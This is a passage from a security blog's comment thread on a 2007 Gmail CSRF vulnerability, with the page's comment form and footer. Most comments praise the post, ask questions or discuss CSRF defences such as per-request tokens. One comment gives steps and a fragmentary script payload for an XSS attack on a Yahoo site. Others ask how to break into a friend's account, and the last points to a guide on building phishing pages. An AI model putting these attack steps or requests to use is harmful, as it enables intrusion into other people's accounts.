		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-53118">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/8f3c9f368e554f1126a7563e679a4de6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Panio Donev</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53118">
			September 27, 2007 at 11:50 am</a>		</div>

		<p>Good job. Only maybe you should have notified google first (and ask for a hefty ransom :-)).</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-53156">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53156">
			September 27, 2007 at 7:29 pm</a>		</div>

		<p>Giorgio Maone,</p>
<p>That&#8217;s actually pretty cool, nice work! I&#8217;m a big fan of NoScript btw!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-53173">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/8e1b4a5b128ddf2323e289e299d3bf55?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Lizandro Diaz</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53173">
			September 27, 2007 at 9:07 pm</a>		</div>

		<p>Com&#8217;on GMAIL this is the second time, this happens, enough is enough.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-53288">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/de37b9dc788b0268d438591e085e4496?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://sirdarckcat.blogspot.com/' rel='external nofollow' class='url'>sirdarckcat</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53288">
			September 28, 2007 at 5:10 am</a>		</div>

		<p>yeap, the bug has been fixed, as you can see, the request now has a new field named &#8220;at&#8221;, that has 2 hex-strings separated by a slash, the first one appears to be a session identifier, and the second a counter.</p>
<p>Greetz!!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-53326">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53326">
			September 28, 2007 at 7:50 am</a>		</div>

		<p>check above for further details on the vulnerability&#8230;</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-53358">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/fd137cf8185b5b71f0c8fe5eda095375?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.muycapaz.net/' rel='external nofollow' class='url'>MuyCapaz</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53358">
			September 28, 2007 at 9:51 am</a>		</div>

		<p>Forgive my ignorance, but wouldn&#8217;t launching every click in a separate virtual machine sandbox go a long way toward a solution?  No cross pollination, no problem, right?</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-53360">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/271ecedbd232e23677ddc1d3956147eb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://hackathology.blogspot.com/' rel='external nofollow' class='url'>hackathology</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53360">
			September 28, 2007 at 9:57 am</a>		</div>

		<p>nice one pdp!!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-53386">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53386">
			September 28, 2007 at 11:54 am</a>		</div>

		<p>Is it just me, or is this the security post with the biggest number of trackbacks on the planet? :-D</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-53466">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53466">
			September 28, 2007 at 6:30 pm</a>		</div>

		<p>MuyCapaz, the sandboxing model will help protecting you box but not your data!!!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-53668">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/4845d1f3289ed725286d4813cc3e267f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">thornade</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53668">
			September 29, 2007 at 11:07 am</a>		</div>

		<p>Did someone know if this other bugs has been fixed <a href="http://xs-sniper.com/blog/Google-Docs-Cross-Domain-Hole/" rel="nofollow">http://xs-sniper.com/blog/Goog.....main-Hole/</a></p>
<p>It concerns Google Docs &amp; Crossdomain.xml</p>
<p>Thorn</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-53679">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/09cfb4a035d13bf45d6fd8fec4038926?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.s-lan.org/' rel='external nofollow' class='url'>SNaRe</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53679">
			September 29, 2007 at 11:56 am</a>		</div>

		<p>I heard that google fixed this problem</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-53751">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/5408a73f5f7447ddce88388df02b3ea7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://none/' rel='external nofollow' class='url'>alok</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53751">
			September 29, 2007 at 6:16 pm</a>		</div>

		<p>this is good but it has some problem like it doesn&#8217;t  describe a lot about hw it hack the email account&#8230;. it requires little bit more description</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-53879">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/bf5a66d322fc6b46324b6a3abbb0e5ff?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.secniche.org/' rel='external nofollow' class='url'>0kn0ck</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-53879">
			September 30, 2007 at 8:12 am</a>		</div>

		<p>Good stuff man!.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-54228">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/82d7c36b6575474fb5d7ba2ca294dfc5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Romain Wartel</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-54228">
			October 1, 2007 at 3:30 pm</a>		</div>

		<p>This is the second CSRF affecting GMail recently. Is there any details on how they fixed the two vulnerabilities?</p>
<p>Romain.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-54319">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/e44fac1db15566e303ccba6bf3de2812?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.ranjkar.com/' rel='external nofollow' class='url'>Ranjkar</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-54319">
			October 1, 2007 at 9:33 pm</a>		</div>

		<p>That&#8217;s actually pretty cool, nice work! I&#8217;m a big fan of NoScript btw!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-59255">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/907d968fcac534a8f238ebe42e5471cd?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.zieglergroup.com/' rel='external nofollow' class='url'>MARKY</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-59255">
			October 17, 2007 at 9:22 pm</a>		</div>

		<p>Salut,</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-59452">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/598702cfa66c64bf2236a7020e54ee34?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Hacker</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-59452">
			October 18, 2007 at 8:46 pm</a>		</div>

		<p>Yahoo has similar attack holes in <a href="http://omg.yahoo.com/" rel="nofollow">http://omg.yahoo.com/</a></p>
<p>Attack example</p>
<p><a href="http://omg.yahoo.com/happy-birthday-zac/photos/810/6" rel="nofollow">http://omg.yahoo.com/happy-bir.....otos/810/6</a></p>
<p>1. Get yahoo 360 blog &#8230; upload your picture in the blog and select the picture to be shared in settings.</p>
<p>2. Go to above omg.Yahoo.com/something and comment in the box with any evil script type url.</p>
<p>Now the example attack im using is with 360.</p>
<p>Post: <code>"&gt;YahooHacked');"&gt;</code></p>
<p>This script will replace all others users avatars with your own avatar and you will recive a Yahoo Admin Email and might have your account closed &#8230; Enjoy</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-79898">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/5eec41ca815936ff4fa0b38e2d48273d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">brielle</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-79898">
			December 1, 2007 at 8:40 pm</a>		</div>

		<p>lol&#8230;this makes no sense 2 me&#8230;it sounds great however does this stuff work 2 catch a cheating spouse???</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-91544">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/604619bdf37843700f1dc622ba8c6bf0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://rootshell.be/~grawity/' rel='external nofollow' class='url'>grawity</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-91544">
			December 25, 2007 at 6:28 pm</a>		</div>

		<p>came here by browsing archives&#8230; is the account in seq1.jpg yours? it looks that the jvyyuie guy is adding all the Wink to his friends.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-91616">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/fab9bf307725606556840d9a5f291c5c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.u8sex.com/' rel='external nofollow' class='url'>sexyman</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-91616">
			December 25, 2007 at 8:58 pm</a>		</div>

		<p>thanks for keeping us up to speed and even moreso for making sure these script kiddies don&#8217;t figure out how to do it (eventho fixed). keep up the good work!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-91734">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/6bc4d517679a88c599148f1c188984f5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://area51solutions.com/' rel='external nofollow' class='url'>Rockdrala</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-91734">
			December 26, 2007 at 1:42 pm</a>		</div>

		<p>You fix the exploit by not opening mail or clicking on any links in mail from people you dont know silly :p </p>
<p>This crap is old. Anyone can sploit this.  </p>
<p>This technique has been out long before Gmail was even a thought. And its one of those things thats always going to be around. </p>
<p>Some people use mail server hacks where they can send a email completely from a email like &#8220;support@paypal.com&#8221; and have the paypal page in the email but when you click on the link it goes to there cookie sploiting site instead of people or even worse may collect your login information becuase your too silly to look at the url or they have a URL rewrite filter that makes it look like its paypal. </p>
<p>The only thing you can do to fight these things. </p>
<p>1. Dont open mail from people you dont know.<br />
2. If the mail is from a potential customer &#8220;someone you need to meet through email as a new person&#8221; then setup a email address for that flow like <a href="mailto:sales@mydomain.com">sales@mydomain.com</a> Makes sure the mail is scanned for virus and spoof checked.<br />
3. Use a smaller email provider. Smaller email service providers can take more care in adding custom SPF records and spam filters in the Mail server for your pop and smtp service that checks headers and makes the mail actually comes from what it says its coming from.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-93279">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/d9892a954dd3f8e0279c7442a853cebd?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.roywhyte.ca/' rel='external nofollow' class='url'>Green Party Guy</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-93279">
			December 29, 2007 at 9:56 pm</a>		</div>

		<p>Thanks for posting this. A good friend had their account compromised and they wondering why their domain name registrations were stolen from them.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-93394">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-93394">
			December 30, 2007 at 6:13 am</a>		</div>

		<p>Green Party Guy, we are aware of the case, though it is very hard to define the method the attacker has used in order to hijack the account in question.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-94192">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/5def4adc5610d71f3b872ffb2be92e23?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.consumedconsumer.org/' rel='external nofollow' class='url'>Consumed Consumer</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-94192">
			December 31, 2007 at 11:23 pm</a>		</div>

		<p>Very informative, esp. the trick for NoScript (kiddies) :)</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-104334">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/88f225d9d64d501561b86e7037fb9158?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://adrenalin.wordpress.com/' rel='external nofollow' class='url'>Nicolae Namolovan</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-104334">
			January 27, 2008 at 4:49 am</a>		</div>

		<p>I think CSRF can be easily defeated by checking referer. If your site is not supposed to receive any POST from any 3th party side, then check where POST comes from and block them altogether.<br />
Surprised that gmail is not doing this..</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-104381">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-104381">
			January 27, 2008 at 9:40 am</a>		</div>

		<p>Nicolae, refers can be spoofed, not to mention that you can configure your browser not to send them at all. Therefore, CSRF protection based on refers only is not a solution. The only solution is to implement random tokens per request and store their values within the form you want to check for a CSRF condition. This works and this is what the Google folks tried to do, although their implementation was seriously flawed.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-111576">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/305eeb15fb40f7f0339209702e6a87f3?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://non/' rel='external nofollow' class='url'>adilah</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111576">
			February 8, 2008 at 6:01 am</a>		</div>

		<p>I would like to hack into my friends account i believe that she is hidding something from me</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-115768">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/3570a47862e0b2379244fa18f0a73ae2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Rogger</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115768">
			March 2, 2008 at 3:13 pm</a>		</div>

		<p>Hey&#8230;.</p>
<p>I m not understanding what have to do in the filter&#8230;. can anyone plz tell me&#8230;&#8230;</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-121070">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/189f9c2030626bd7d8f436eb985fbd9f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">rok</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-121070">
			May 7, 2008 at 4:50 pm</a>		</div>

		<p>but these days mitm is possible though..:d</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-122569">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/ea8095e8899f0ef382a7ba873e32441f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Johnes I.</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-122569">
			June 19, 2008 at 9:29 pm</a>		</div>

		<p>I have been locked out of my gmail account. How do I hack back in?</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-125946">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/9c852609f51d72fbc6eaa4303d090d92?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Jay</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-125946">
			February 13, 2009 at 3:50 am</a>		</div>

		<p>Wow, lifesavers, you guys totally rock.  My problem is that I think I have a total data stream process on me &#8211; from gmail, devart, facebook, google searching &#8211; everything.  May also have got into or are trying to get into my ISP email.  My complete digital footprint seems to have been uplifted and is being taunted back to me on various bogus sites found through combining my various identity markers in google searches.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-127467">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/38de284147db9f4311379749056913b2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.rmadeat.com/' rel='external nofollow' class='url'>rmadeat</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127467">
			June 11, 2009 at 4:33 pm</a>		</div>

		<p>Quote :</p>
<p>Wow, lifesavers, you guys totally rock. My problem is that I think I have a total data stream process on me &#8211; from gmail, devart, facebook, google searching &#8211; everything. May also have got into or are trying to get into my ISP email. My complete digital footprint seems to have been uplifted and is being taunted back to me on various bogus sites found through combining my various identity markers in google searches.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-127843">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/45a98ec32e490772c0d0ca3a8e04951e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.tiestofun.com/' rel='external nofollow' class='url'>tiesto</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-127843">
			September 15, 2009 at 5:37 am</a>		</div>

		<p>Love You Gmail :p</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-128401">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/8fc0f7a4ee9a43d890a12ea25cb8ad85?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Edward</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128401">
			March 25, 2010 at 8:12 am</a>		</div>

		<p>2 points. </p>
<p>1. the perp could create the filter temporarily then delete it &amp; repeat etc. how would one know it have ever been there?<br />
2. i just discovered gmail messages can be &#8216;deleted forever&#8217; so one may never know what emails have been sent/received. this is not a good idea from Gmail. all historic entries should be traceable from the logs.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-128573">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/0d72a1a9c67f3442d92d4e7075d3e4d2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.facebook.com/johnwoodz1' rel='external nofollow' class='url'>John Woodz</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128573">
			June 21, 2010 at 6:30 am</a>		</div>

		<p>Was once hacked by watever means i dont know but all contact addresses in my account were being send an email using my gmail account by some hacker perporting to be me.! since am a general mind i stopped using gmail was the best i kuld do i hav no idea about java scripting or watever technical terms u talkn here bt i just wana be safe do i doubt technogy en go stone age !</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-128640">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/268fdb66013b277b2cac61eccb0b793c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://dish-drainer.com/' rel='external nofollow' class='url'>Janet</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128640">
			July 11, 2010 at 6:52 am</a>		</div>

		<p>wow i didnt know that was possible!</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-128659">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/dbed6c9ad6e12ced4d9af8491a96ba75?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.videovideolar.com/' rel='external nofollow' class='url'>video videolar</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128659">
			July 15, 2010 at 11:13 pm</a>		</div>

		<p>Nicolae, refers can be spoofed, not to mention that you can configure your browser not to send them at all. Therefore, CSRF protection based on refers only is not a solution. The only solution is to implement random tokens per request and store their values within the form you want to check for a CSRF condition. This works and this is what the Google folks tried to do, although their implementation was seriously flawed.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-129248">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/5f2003fdaed6012162d2645206a4e606?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://secworm.net/forums/' rel='external nofollow' class='url'>Ethical Hacking Forum</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-129248">
			October 28, 2010 at 8:46 am</a>		</div>

		<p>Phishing &#8211; Phishing is by far the most used and easiest method. The attacker simply sets up a page that looks exactly like the real email login page and tricks people into entering their login information.</p>
<p>Update: Check out the new post on how to create your own phishing page here.</p>

		<div class="reply">
				</div>
		</div>
		</div>
		
		<div class="post-comments-navigation">
			<div class="older-comments"></div>
			<div class="newer-comments"></div>
		</div>
	
	<div id="post-response">
		<h2>Respond</h2>
					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
									<div><label for="author">name: (required)</label></div>
					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
					<div><label for="email">mail: (required)</label></div>
					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
					<div><label for="url">website:</label></div>
					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
								<div><label for="comment">comment:</label></div>
				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
				<div>
					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
				</div>
				<input type="hidden" name="comment_post_ID" value="471"/>
				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="83f5610042" /></p>

	<p style="clear: both;" class="subscribe-to-comments">
	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
	<label for="subscribe">Notify me of followup comments via e-mail</label>
	</p>


			</form>
			</div>
					</div>
		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>

				
		<div id="footer">
			
	<script type="text/javascript">
		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
	</script>
	<script type="text/javascript">
		var pageTracker = _gat._getTracker('UA-363996-1');
		pageTracker._initData();
		pageTracker._trackPageview();
	</script>

				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
		</div>
		
		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
			<Work rdf:about="">
				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
				<dc:title>GNUCITIZEN</dc:title>
				<dc:date>2005-2012</dc:date>
				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
				<dc:source rdf:resource="http://www.gnucitizen.org"/>
			</Work>
			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
